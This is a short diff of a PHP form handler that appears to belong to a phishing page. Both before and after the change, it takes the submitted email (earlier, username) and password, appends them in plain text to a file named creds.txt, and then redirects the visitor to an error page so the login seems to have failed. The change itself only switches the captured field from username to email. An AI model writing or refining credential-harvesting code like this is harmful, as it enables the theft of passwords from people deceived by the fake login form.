@@ -5,8 +5,8 @@ ini_set('display_errors', 1);
 
 // Handle form submission
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    if (!empty($_POST['username']) && !empty($_POST['password'])) {
-        file_put_contents("creds.txt", "User: {$_POST['username']} | Pass: {$_POST['password']}\n", FILE_APPEND);
+    if (!empty($_POST['email']) && !empty($_POST['password'])) {
+        file_put_contents("creds.txt", "User: {$_POST['email']} | Pass: {$_POST['password']}\n", FILE_APPEND);
         // Redirect BEFORE any output
         header("Location: error.html");
         exit;
